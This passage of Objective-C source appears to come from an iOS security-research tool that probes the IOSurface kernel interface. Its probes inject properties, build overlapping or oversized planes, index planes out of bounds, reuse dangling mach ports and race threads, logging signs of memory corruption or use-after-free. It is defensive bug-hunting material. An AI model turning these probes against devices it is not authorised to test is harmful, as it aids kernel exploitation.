            ISR_CopyAllValuesFn copyAllValues = (ISR_CopyAllValuesFn)dlsym(sym.iosurface, "IOSurfaceCopyAllValues");

            if (!setValue || !copyValue || !removeValue) {
                log(@"PROPINJECT: Missing IOSurface property APIs");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"PROPINJECT: Starting property injection analysis");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            NSDictionary *params = isr_default_surface_params(64, 64);
            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);
            if (!surf) {
                log(@"PROPINJECT: Failed to create surface");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            size_t origWidth = sym.getWidth(surf);
            size_t origHeight = sym.getHeight(surf);
            size_t origAllocSize = sym.getAllocSize(surf);

            // Phase A — Property stress: 500 properties x 1024 bytes = 512KB into kernel
            log(@"PROPINJECT: Phase A — property stress test (500 x 1KB)");
            uint8_t filler[1024];
            memset(filler, 0xBE, sizeof(filler));
            CFDataRef bigData = CFDataCreate(kCFAllocatorDefault, filler, sizeof(filler));

            uint32_t propsSet = 0;
            BOOL surfaceCorrupted = NO;
            for (int i = 0; i < 500 && !isr_stopped(); i++) {
                NSString *key = [NSString stringWithFormat:@"prop_%03d", i];
                setValue(surf, (__bridge CFStringRef)key, bigData);
                propsSet++;

                if ((i + 1) % 50 == 0) {
                    size_t curWidth = sym.getWidth(surf);
                    size_t curAllocSize = sym.getAllocSize(surf);
                    if (curWidth != origWidth) {
                        anomalies++;
                        surfaceCorrupted = YES;
                        log([NSString stringWithFormat:
                            @"PROPINJECT: ANOMALY — width changed from %zu to %zu after %d props!",
                            origWidth, curWidth, i + 1]);
                    }
                    if (curAllocSize != origAllocSize) {
                        anomalies++;
                        log([NSString stringWithFormat:
                            @"PROPINJECT: ANOMALY — allocSize changed from %zu to %zu after %d props!",
                            origAllocSize, curAllocSize, i + 1]);
                    }
                    log([NSString stringWithFormat:
                        @"PROPINJECT: %d props set, width=%zu allocSize=%zu — %@",
                        i + 1, curWidth, curAllocSize,
                        (curWidth == origWidth && curAllocSize == origAllocSize) ? @"OK" : @"CHANGED"]);
                }
            }
            CFRelease(bigData);

            if (propsSet > 0 && !isr_stopped()) {
                CFTypeRef readback = copyValue(surf, CFSTR("prop_000"));
                if (!readback) {
                    anomalies++;
                    log(@"PROPINJECT: ANOMALY — first property read back as NULL");
                } else {
                    if (CFGetTypeID(readback) != CFDataGetTypeID()) {
                        anomalies++;
                        log(@"PROPINJECT: ANOMALY — property type changed on readback!");
                    }
                    CFRelease(readback);
                }
            }

            if (copyAllValues && !isr_stopped()) {
                CFDictionaryRef all = copyAllValues(surf);
                if (all) {
                    CFIndex count = CFDictionaryGetCount(all);
                    log([NSString stringWithFormat:@"PROPINJECT: Total properties stored: %ld", (long)count]);
                    if (count < (CFIndex)propsSet) {
                        anomalies++;
                        log([NSString stringWithFormat:
                            @"PROPINJECT: ANOMALY — expected %u properties but only %ld stored (silent drop)",
                            propsSet, (long)count]);
                    }
                    CFRelease(all);
                }
            }

            log([NSString stringWithFormat:@"PROPINJECT: Phase A — %u properties injected, corrupted=%@",
                propsSet, surfaceCorrupted ? @"YES" : @"NO"]);

            // Phase B — Oversized value injection
            if (!isr_stopped()) {
                log(@"PROPINJECT: Phase B — oversized value injection");

                size_t mbSize = 1024 * 1024;
                uint8_t *mbBuf = calloc(1, mbSize);
                if (mbBuf) {
                    memset(mbBuf, 0xDD, mbSize);
                    CFDataRef mbData = CFDataCreate(kCFAllocatorDefault, mbBuf, (CFIndex)mbSize);
                    if (mbData) {
                        setValue(surf, CFSTR("giant_value"), mbData);
                        CFTypeRef rb = copyValue(surf, CFSTR("giant_value"));
                        if (rb) {
                            if (CFGetTypeID(rb) == CFDataGetTypeID()) {
                                CFIndex len = CFDataGetLength((CFDataRef)rb);
                                log([NSString stringWithFormat:@"PROPINJECT: 1MB value stored, readback=%ld bytes", (long)len]);
                                if (len != (CFIndex)mbSize) {
                                    anomalies++;
                                    log(@"PROPINJECT: ANOMALY — 1MB value size mismatch on readback!");
                                }
                            } else {
                                anomalies++;
                                log(@"PROPINJECT: ANOMALY — 1MB value type changed on readback!");
                            }
                            CFRelease(rb);
                        } else {
                            log(@"PROPINJECT: 1MB value could not be read back (silently dropped)");
                        }
                        CFRelease(mbData);
                    }
                    free(mbBuf);
                }

                NSMutableString *longKey = [NSMutableString stringWithCapacity:10000];
                for (int i = 0; i < 10000; i++) [longKey appendString:@"K"];
                int32_t num42 = 42;
                CFNumberRef val42 = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &num42);
                setValue(surf, (__bridge CFStringRef)longKey, val42);
                CFTypeRef rbLong = copyValue(surf, (__bridge CFStringRef)longKey);
                if (rbLong) {
                    log(@"PROPINJECT: 10000-char key accepted and readable");
                    CFRelease(rbLong);
                } else {
                    log(@"PROPINJECT: 10000-char key rejected or unreadable");
                }
                CFRelease(val42);

                int32_t n99 = 99;
                CFNumberRef cfNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &n99);
                CFStringRef cfStr = CFStringCreateWithCString(kCFAllocatorDefault, "test_string", kCFStringEncodingUTF8);
                uint8_t db[] = {0x01, 0x02, 0x03};
                CFDataRef cfDat = CFDataCreate(kCFAllocatorDefault, db, 3);
                CFTypeRef arrVals[] = { kCFBooleanTrue };
                CFArrayRef cfArr = CFArrayCreate(kCFAllocatorDefault, arrVals, 1, &kCFTypeArrayCallBacks);
                CFStringRef dk = CFSTR("k");
                CFTypeRef dv = kCFBooleanFalse;
                CFDictionaryRef cfDict = CFDictionaryCreate(kCFAllocatorDefault,
                    (const void **)&dk, (const void **)&dv, 1,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

                struct { const char *label; CFTypeRef val; CFTypeID expected; } types[] = {
                    {"CFNumber", cfNum, CFNumberGetTypeID()},
                    {"CFString", cfStr, CFStringGetTypeID()},
                    {"CFData", cfDat, CFDataGetTypeID()},
                    {"CFBoolean", kCFBooleanTrue, CFBooleanGetTypeID()},
                    {"CFArray", cfArr, CFArrayGetTypeID()},
                    {"CFDictionary", cfDict, CFDictionaryGetTypeID()},
                };

                uint32_t typeMismatches = 0;
                for (int t = 0; t < 6; t++) {
                    NSString *tkey = [NSString stringWithFormat:@"typetest_%s", types[t].label];
                    setValue(surf, (__bridge CFStringRef)tkey, types[t].val);
                    CFTypeRef rb = copyValue(surf, (__bridge CFStringRef)tkey);
                    if (rb) {
                        if (CFGetTypeID(rb) != types[t].expected) {
                            typeMismatches++;
                            log([NSString stringWithFormat:
                                @"PROPINJECT: ANOMALY — type confusion! Set %s, got typeID %lu",
                                types[t].label, CFGetTypeID(rb)]);
                        }
                        CFRelease(rb);
                    } else {
                        log([NSString stringWithFormat:@"PROPINJECT: %s value silently dropped", types[t].label]);
                    }
                }
                CFRelease(cfNum); CFRelease(cfStr); CFRelease(cfDat);
                CFRelease(cfArr); CFRelease(cfDict);

                if (typeMismatches > 0) {
                    anomalies++;
                    log([NSString stringWithFormat:@"PROPINJECT: %u type mismatches detected", typeMismatches]);
                } else {
                    log(@"PROPINJECT: Phase B — all types preserved correctly");
                }
            }

            // Phase C — Reserved key injection
            if (!isr_stopped()) {
                log(@"PROPINJECT: Phase C — reserved key injection");
                size_t preWidth = sym.getWidth(surf);
                size_t preHeight = sym.getHeight(surf);
                size_t preAlloc = sym.getAllocSize(surf);
                size_t preBPR = sym.getBytesPerRow(surf);

                NSArray *reservedKeys = @[
                    @"IOSurfaceWidth", @"IOSurfaceHeight", @"IOSurfaceAllocSize",
                    @"IOSurfaceBytesPerRow", @"IOSurfacePixelFormat", @"IOSurfaceBytesPerElement",
                    @"IOSurfaceIsGlobal"
                ];
                NSArray *reservedVals = @[@9999, @9999, @999999, @9999, @0x00000000, @8, @YES];

                for (NSUInteger i = 0; i < reservedKeys.count && !isr_stopped(); i++) {
                    NSString *rk = reservedKeys[i];
                    id rv = reservedVals[i];
                    setValue(surf, (__bridge CFStringRef)rk, (__bridge CFTypeRef)rv);

                    CFTypeRef readback = copyValue(surf, (__bridge CFStringRef)rk);
                    BOOL wasSet = (readback != NULL);
                    if (readback) CFRelease(readback);

                    log([NSString stringWithFormat:@"PROPINJECT: Set %@ = %@ — stored=%@",
                        rk, rv, wasSet ? @"YES" : @"NO"]);
                }

                size_t postWidth = sym.getWidth(surf);
                size_t postHeight = sym.getHeight(surf);
                size_t postAlloc = sym.getAllocSize(surf);
                size_t postBPR = sym.getBytesPerRow(surf);

                if (postWidth != preWidth) {
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"PROPINJECT: ANOMALY — WIDTH CHANGED via reserved key! %zu -> %zu", preWidth, postWidth]);
                }
                if (postHeight != preHeight) {
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"PROPINJECT: ANOMALY — HEIGHT CHANGED via reserved key! %zu -> %zu", preHeight, postHeight]);
                }
                if (postAlloc != preAlloc) {
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"PROPINJECT: ANOMALY — ALLOCSIZE CHANGED via reserved key! %zu -> %zu", preAlloc, postAlloc]);
                }
                if (postBPR != preBPR) {
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"PROPINJECT: ANOMALY — BYTESPERROW CHANGED via reserved key! %zu -> %zu", preBPR, postBPR]);
                }
                if (postWidth == preWidth && postHeight == preHeight &&
                    postAlloc == preAlloc && postBPR == preBPR) {
                    log(@"PROPINJECT: Phase C — reserved keys did NOT change surface geometry");
                }

                IOSurfaceID sid = sym.getID(surf);
                IOSurfaceRef globalLookup = sym.lookup(sid);
                if (globalLookup) {
                    log(@"PROPINJECT: Surface is globally visible via lookup");
                    CFRelease(globalLookup);
                } else {
                    log(@"PROPINJECT: Surface NOT globally visible (IOSurfaceIsGlobal had no effect)");
                }
            }

            // Phase D — Remove-while-reading race
            if (!isr_stopped()) {
                log(@"PROPINJECT: Phase D — property read/write/remove race");

                for (int i = 0; i < 10; i++) {
                    NSString *rk = [NSString stringWithFormat:@"race_%d", i];
                    int32_t v = i;
                    CFNumberRef nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &v);
                    setValue(surf, (__bridge CFStringRef)rk, nv);
                    CFRelease(nv);
                }

                __block atomic_uint raceAnomalies = 0;
                __block atomic_bool raceRunning = true;

                dispatch_group_t grp = dispatch_group_create();
                for (int t = 0; t < 4; t++) {
                    dispatch_group_async(grp, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
                        while (atomic_load(&raceRunning)) {
                            int idx = arc4random_uniform(10);
                            NSString *rk = [NSString stringWithFormat:@"race_%d", idx];
                            if (t < 2) {
                                int32_t v = (int32_t)arc4random();
                                CFNumberRef nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &v);
                                setValue(surf, (__bridge CFStringRef)rk, nv);
                                CFRelease(nv);
                            } else {
                                CFTypeRef rb = copyValue(surf, (__bridge CFStringRef)rk);
                                if (rb) {
                                    if (CFGetTypeID(rb) != CFNumberGetTypeID()) {
                                        atomic_fetch_add(&raceAnomalies, 1);
                                    }
                                    CFRelease(rb);
                                }
                                if (arc4random_uniform(4) == 0) {
                                    removeValue(surf, (__bridge CFStringRef)rk);
                                }
                            }
                        }
                    });
                }

                usleep(100000);
                atomic_store(&raceRunning, false);
                dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

                uint32_t raceAnom = atomic_load(&raceAnomalies);
                if (raceAnom > 0) {
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"PROPINJECT: ANOMALY — %u type mismatches during race!", raceAnom]);
                } else {
                    log(@"PROPINJECT: Phase D — no type confusion during race");
                }
            }

            CFRelease(surf);
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"PROPINJECT: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"propsSet": @(propsSet),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-PropertyInject-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

// --- Probe 23: Plane Overlap Attack ---

void iosurface_research_plane_overlap(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"PLANEOVLAP: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            typedef size_t (*ISR_PlaneCountFn)(IOSurfaceRef);
            typedef size_t (*ISR_PlaneDimFn)(IOSurfaceRef, size_t);
            typedef void * (*ISR_PlaneBaseFn)(IOSurfaceRef, size_t);

            ISR_PlaneCountFn getPlaneCount = (ISR_PlaneCountFn)dlsym(sym.iosurface, "IOSurfaceGetPlaneCount");
            ISR_PlaneDimFn getPlaneWidth = (ISR_PlaneDimFn)dlsym(sym.iosurface, "IOSurfaceGetWidthOfPlane");
            ISR_PlaneDimFn getPlaneHeight = (ISR_PlaneDimFn)dlsym(sym.iosurface, "IOSurfaceGetHeightOfPlane");
            ISR_PlaneDimFn getPlaneBPR = (ISR_PlaneDimFn)dlsym(sym.iosurface, "IOSurfaceGetBytesPerRowOfPlane");
            ISR_PlaneBaseFn getPlaneBase = (ISR_PlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");

            if (!getPlaneCount || !getPlaneBase) {
                log(@"PLANEOVLAP: Missing plane APIs");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"PLANEOVLAP: Starting plane overlap analysis");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            // Phase A — Overlapping planes (both at offset 0)
            log(@"PLANEOVLAP: Phase A — overlapping plane offsets");
            {
                NSDictionary *plane0 = @{
                    @"IOSurfacePlaneWidth": @64,
                    @"IOSurfacePlaneHeight": @64,
                    @"IOSurfacePlaneBytesPerElement": @1,
                    @"IOSurfacePlaneOffset": @0,
                    @"IOSurfacePlaneBytesPerRow": @64,
                    @"IOSurfacePlaneSize": @4096
                };
                NSDictionary *plane1 = @{
                    @"IOSurfacePlaneWidth": @64,
                    @"IOSurfacePlaneHeight": @64,
                    @"IOSurfacePlaneBytesPerElement": @1,
                    @"IOSurfacePlaneOffset": @0,
                    @"IOSurfacePlaneBytesPerRow": @64,
                    @"IOSurfacePlaneSize": @4096
                };
                NSDictionary *params = @{
                    @"IOSurfaceWidth": @64,
                    @"IOSurfaceHeight": @64,
                    @"IOSurfaceBytesPerElement": @1,
                    @"IOSurfaceBytesPerRow": @64,
                    @"IOSurfaceAllocSize": @8192,
                    @"IOSurfacePixelFormat": @0x34323076,
                    @"IOSurfacePlaneInfo": @[plane0, plane1]
                };

                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);
                if (surf) {
                    size_t planes = getPlaneCount(surf);
                    log([NSString stringWithFormat:@"PLANEOVLAP: Overlap surface created — %zu planes", planes]);

                    sym.lock(surf, 0, NULL);
                    void *base0 = getPlaneBase(surf, 0);
                    void *base1 = getPlaneBase(surf, 1);

                    if (base0 && base1) {
                        memset(base0, 0xAA, 64);
                        uint8_t readByte = ((uint8_t *)base1)[0];
                        log([NSString stringWithFormat:
                            @"PLANEOVLAP: Wrote 0xAA to plane0, read 0x%02X from plane1, base0=%p base1=%p",
                            readByte, base0, base1]);

                        if (readByte == 0xAA && base0 == base1) {
                            anomalies++;
                            log(@"PLANEOVLAP: ANOMALY — planes SHARE memory! Cross-plane data leak confirmed!");
                        } else if (readByte == 0xAA && base0 != base1) {
                            anomalies++;
                            log(@"PLANEOVLAP: ANOMALY — different base addresses but data leaked across planes!");
                        } else {
                            log(@"PLANEOVLAP: Planes isolated despite same offset (kernel corrected)");
                        }
                    } else {
                        log([NSString stringWithFormat:@"PLANEOVLAP: base0=%p base1=%p", base0, base1]);
                    }
                    sym.unlock(surf, 0, NULL);
                    CFRelease(surf);
                } else {
                    log(@"PLANEOVLAP: Kernel rejected overlapping plane config");
                }
            }

            // Phase B — Plane extending beyond allocSize
            if (!isr_stopped()) {
                log(@"PLANEOVLAP: Phase B — oversized plane for OOB read");
                NSDictionary *bigPlane = @{
                    @"IOSurfacePlaneWidth": @128,
                    @"IOSurfacePlaneHeight": @128,
                    @"IOSurfacePlaneBytesPerElement": @1,
                    @"IOSurfacePlaneOffset": @0,
                    @"IOSurfacePlaneBytesPerRow": @128,
                    @"IOSurfacePlaneSize": @16384
                };
                NSDictionary *params = @{
                    @"IOSurfaceWidth": @64,
                    @"IOSurfaceHeight": @64,
                    @"IOSurfaceBytesPerElement": @1,
                    @"IOSurfaceBytesPerRow": @64,
                    @"IOSurfaceAllocSize": @4096,
                    @"IOSurfacePixelFormat": @0x34323076,
                    @"IOSurfacePlaneInfo": @[bigPlane]
                };

                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);
                if (surf) {
                    size_t actualAlloc = sym.getAllocSize(surf);
                    size_t planes = getPlaneCount(surf);
                    log([NSString stringWithFormat:
                        @"PLANEOVLAP: Oversized plane surface created — allocSize=%zu planes=%zu",
                        actualAlloc, planes]);

                    if (planes > 0 && getPlaneBPR) {
                        size_t planeBPR = getPlaneBPR(surf, 0);
                        size_t planeH = getPlaneHeight ? getPlaneHeight(surf, 0) : 0;
                        size_t planeBytes = planeBPR * planeH;
                        log([NSString stringWithFormat:
                            @"PLANEOVLAP: Plane claims %zu bytes (bpr=%zu h=%zu), alloc=%zu",
                            planeBytes, planeBPR, planeH, actualAlloc]);

                        if (planeBytes > actualAlloc) {
                            anomalies++;
                            log([NSString stringWithFormat:
                                @"PLANEOVLAP: ANOMALY — plane claims %zu bytes beyond %zu alloc (potential OOB!)",
                                planeBytes, actualAlloc]);

                            sym.lock(surf, 0, NULL);
                            void *pBase = getPlaneBase(surf, 0);
                            if (pBase) {
                                volatile uint8_t oobRead = ((uint8_t *)pBase)[actualAlloc - 1];
                                log([NSString stringWithFormat:
                                    @"PLANEOVLAP: Read at allocSize-1 = 0x%02X (within bounds)", oobRead]);
                            }
                            sym.unlock(surf, 0, NULL);
                        } else {
                            log(@"PLANEOVLAP: Kernel adjusted plane to fit allocSize");
                        }
                    }
                    CFRelease(surf);
                } else {
                    log(@"PLANEOVLAP: Kernel rejected oversized plane config");
                }
            }

            // Phase C — Plane count manipulation and OOB plane index
            if (!isr_stopped()) {
                log(@"PLANEOVLAP: Phase C — plane count manipulation");
                int testCounts[] = {1, 2, 3, 4};
                uint32_t oobAccess = 0;

                for (int tc = 0; tc < 4 && !isr_stopped(); tc++) {
                    int nPlanes = testCounts[tc];
                    NSMutableArray *planeArr = [NSMutableArray array];
                    for (int p = 0; p < nPlanes; p++) {
                        [planeArr addObject:@{
                            @"IOSurfacePlaneWidth": @32,
                            @"IOSurfacePlaneHeight": @32,
                            @"IOSurfacePlaneBytesPerElement": @1,
                            @"IOSurfacePlaneOffset": @(p * 1024),
                            @"IOSurfacePlaneBytesPerRow": @32,
                            @"IOSurfacePlaneSize": @1024
                        }];
                    }
                    NSDictionary *params = @{
                        @"IOSurfaceWidth": @32,
                        @"IOSurfaceHeight": @32,
                        @"IOSurfaceBytesPerElement": @1,
                        @"IOSurfaceBytesPerRow": @32,
                        @"IOSurfaceAllocSize": @(nPlanes * 1024),
                        @"IOSurfacePixelFormat": @0x34323076,
                        @"IOSurfacePlaneInfo": planeArr
                    };

                    IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);
                    if (!surf) {
                        log([NSString stringWithFormat:@"PLANEOVLAP: %d-plane surface rejected", nPlanes]);
                        continue;
                    }

                    size_t actual = getPlaneCount(surf);
                    log([NSString stringWithFormat:@"PLANEOVLAP: Requested %d planes, got %zu", nPlanes, actual]);
                    if ((int)actual != nPlanes) {
                        anomalies++;
                        log(@"PLANEOVLAP: ANOMALY — plane count mismatch!");
                    }

                    sym.lock(surf, 0, NULL);
                    size_t oobIdx = actual + 2;
                    void *oobBase = getPlaneBase(surf, oobIdx);
                    if (oobBase != NULL) {
                        oobAccess++;
                        log([NSString stringWithFormat:
                            @"PLANEOVLAP: ANOMALY — OOB plane index %zu returned base %p!", oobIdx, oobBase]);
                    }
                    sym.unlock(surf, 0, NULL);
                    CFRelease(surf);
                }

                if (oobAccess > 0) {
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"PLANEOVLAP: %u OOB plane index accesses returned non-NULL", oobAccess]);
                } else {
                    log(@"PLANEOVLAP: Phase C — all OOB plane accesses returned NULL");
                }
            }

            // Phase D — Format/plane count mismatch
            if (!isr_stopped()) {
                log(@"PLANEOVLAP: Phase D — format/plane mismatch");

                NSDictionary *p0 = @{@"IOSurfacePlaneWidth": @32, @"IOSurfacePlaneHeight": @32,
                    @"IOSurfacePlaneBytesPerElement": @1, @"IOSurfacePlaneOffset": @0,
                    @"IOSurfacePlaneBytesPerRow": @32, @"IOSurfacePlaneSize": @1024};
                NSDictionary *p1 = @{@"IOSurfacePlaneWidth": @16, @"IOSurfacePlaneHeight": @16,
                    @"IOSurfacePlaneBytesPerElement": @2, @"IOSurfacePlaneOffset": @1024,
                    @"IOSurfacePlaneBytesPerRow": @32, @"IOSurfacePlaneSize": @512};
                NSDictionary *p2 = @{@"IOSurfacePlaneWidth": @16, @"IOSurfacePlaneHeight": @16,
                    @"IOSurfacePlaneBytesPerElement": @2, @"IOSurfacePlaneOffset": @1536,
                    @"IOSurfacePlaneBytesPerRow": @32, @"IOSurfacePlaneSize": @512};

                // Test 1: 420v expects 2 planes, provide 3
                NSDictionary *test1Params = @{
                    @"IOSurfaceWidth": @32, @"IOSurfaceHeight": @32,
                    @"IOSurfaceBytesPerElement": @1, @"IOSurfaceBytesPerRow": @32,
                    @"IOSurfaceAllocSize": @2048,
                    @"IOSurfacePixelFormat": @0x34323076,
                    @"IOSurfacePlaneInfo": @[p0, p1, p2]
                };
                IOSurfaceRef s1 = sym.create((__bridge CFDictionaryRef)test1Params);
                if (s1) {
                    size_t pc = getPlaneCount(s1);
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"PLANEOVLAP: ANOMALY — 420v+3planes accepted! planes=%zu", pc]);
                    CFRelease(s1);
                } else {
                    log(@"PLANEOVLAP: 420v+3planes correctly rejected");
                }

                // Test 2: BGRA expects 1 plane, provide 2
                NSDictionary *test2Params = @{
                    @"IOSurfaceWidth": @32, @"IOSurfaceHeight": @32,
                    @"IOSurfaceBytesPerElement": @1, @"IOSurfaceBytesPerRow": @32,
                    @"IOSurfaceAllocSize": @2048,
                    @"IOSurfacePixelFormat": @0x42475241,
                    @"IOSurfacePlaneInfo": @[p0, p1]
                };
                IOSurfaceRef s2 = sym.create((__bridge CFDictionaryRef)test2Params);
                if (s2) {
                    size_t pc = getPlaneCount(s2);
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"PLANEOVLAP: ANOMALY — BGRA+2planes accepted! planes=%zu", pc]);
                    CFRelease(s2);
                } else {
                    log(@"PLANEOVLAP: BGRA+2planes correctly rejected");
                }
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"PLANEOVLAP: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-PlaneOverlap-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

// --- Probe 24: Mach Port & ID Race ---

void iosurface_research_port_race(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"PORTRACE: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            typedef mach_port_t (*ISR_CreatePortFn)(IOSurfaceRef);
            typedef IOSurfaceRef (*ISR_LookupPortFn)(mach_port_t);
            typedef CFDictionaryRef (*ISR_CopyAllValuesFn)(IOSurfaceRef);

            ISR_CreatePortFn createPort = (ISR_CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
            ISR_LookupPortFn lookupPort = (ISR_LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");
            ISR_CopyAllValuesFn copyAllValues = (ISR_CopyAllValuesFn)dlsym(sym.iosurface, "IOSurfaceCopyAllValues");

            if (!createPort || !lookupPort) {
                log(@"PORTRACE: Missing mach port APIs");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"PORTRACE: Starting mach port race analysis");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            // Phase A — Dangling port test
            log(@"PORTRACE: Phase A — mach port lifecycle (dangling port test)");
            {
                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(32, 32));
                if (surf) {
                    IOSurfaceID origID = sym.getID(surf);
                    mach_port_t port = createPort(surf);

                    if (port != MACH_PORT_NULL) {
                        IOSurfaceRef fromPort = lookupPort(port);
                        if (fromPort) {
                            IOSurfaceID fromPortID = sym.getID(fromPort);
                            log([NSString stringWithFormat:
                                @"PORTRACE: Port lookup OK — origID=%u portID=%u match=%@",
                                origID, fromPortID, origID == fromPortID ? @"YES" : @"NO"]);
                            if (origID != fromPortID) {
                                anomalies++;
                                log(@"PORTRACE: ANOMALY — port resolved to different surface!");
                            }
                            CFRelease(fromPort);
                        }

                        CFRelease(surf);
                        surf = NULL;

                        IOSurfaceRef dangling = lookupPort(port);
                        if (dangling) {
                            IOSurfaceID danglingID = sym.getID(dangling);
                            anomalies++;
                            log([NSString stringWithFormat:
                                @"PORTRACE: ANOMALY — DANGLING PORT! Destroyed surface still accessible via port, id=%u",
                                danglingID]);
                            CFRelease(dangling);
                        } else {
                            log(@"PORTRACE: Port correctly invalidated after surface destroy");
                        }

                        mach_port_deallocate(mach_task_self(), port);
                    } else {
                        log(@"PORTRACE: CreateMachPort returned NULL");
                        CFRelease(surf);
                    }
                }
            }

            // Phase B — Port reuse attack
            if (!isr_stopped()) {
                log(@"PORTRACE: Phase B — port reuse attack (100 surfaces)");
                mach_port_t oldPorts[100];
                IOSurfaceID oldIDs[100];
                memset(oldPorts, 0, sizeof(oldPorts));

                IOSurfaceRef surfs[100];
                uint32_t created = 0;
                for (int i = 0; i < 100 && !isr_stopped(); i++) {
                    surfs[i] = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(16, 16));
                    if (surfs[i]) {
                        oldIDs[i] = sym.getID(surfs[i]);
                        oldPorts[i] = createPort(surfs[i]);
                        created++;
                    }
                }
                log([NSString stringWithFormat:@"PORTRACE: Created %u surfaces with ports", created]);

                for (uint32_t i = 0; i < created; i++) {
                    CFRelease(surfs[i]);
                    surfs[i] = NULL;
                }

                IOSurfaceRef newSurfs[100];
                uint32_t newCreated = 0;
                for (int i = 0; i < 100 && !isr_stopped(); i++) {
                    newSurfs[i] = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(16, 16));
                    if (newSurfs[i]) newCreated++;
                }

                uint32_t portConfusion = 0;
                uint32_t portStillValid = 0;
                for (uint32_t i = 0; i < created && !isr_stopped(); i++) {
                    if (oldPorts[i] == MACH_PORT_NULL) continue;
                    IOSurfaceRef resolved = lookupPort(oldPorts[i]);
                    if (resolved) {
                        IOSurfaceID resolvedID = sym.getID(resolved);
                        portStillValid++;
                        if (resolvedID != oldIDs[i]) {
                            portConfusion++;
                            log([NSString stringWithFormat:
                                @"PORTRACE: ANOMALY — old port[%u] (was id=%u) now resolves to id=%u!",
                                i, oldIDs[i], resolvedID]);
                        }
                        CFRelease(resolved);
                    }
                    mach_port_deallocate(mach_task_self(), oldPorts[i]);
                }

                for (uint32_t i = 0; i < newCreated; i++) {
                    if (newSurfs[i]) CFRelease(newSurfs[i]);
                }

                if (portConfusion > 0) {
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"PORTRACE: ANOMALY — %u ports resolved to WRONG surface!", portConfusion]);
                }
                if (portStillValid > 0 && portConfusion == 0) {
                    log([NSString stringWithFormat:
                        @"PORTRACE: %u old ports still valid (port retains surface ref)", portStillValid]);
                }
                if (portStillValid == 0) {
                    log(@"PORTRACE: All old ports correctly invalidated");
                }
            }

            // Phase C — Massive 50-thread race
            if (!isr_stopped()) {
                log(@"PORTRACE: Phase C — 50-thread race condition");
                IOSurfaceRef raceSurf = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(32, 32));
                if (raceSurf) {
                    IOSurfaceID raceID = sym.getID(raceSurf);
                    mach_port_t racePort = createPort(raceSurf);

                    __block atomic_uint wrongLookups = 0;
                    __block atomic_uint nullPorts = 0;
                    __block atomic_uint totalOps = 0;
                    __block atomic_bool running = true;

                    dispatch_group_t grp = dispatch_group_create();
                    dispatch_queue_t q = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0);

                    for (int t = 0; t < 10; t++) {
                        dispatch_group_async(grp, q, ^{
                            while (atomic_load(&running)) {
                                IOSurfaceRef found = sym.lookup(raceID);
                                if (found) {
                                    IOSurfaceID fid = sym.getID(found);
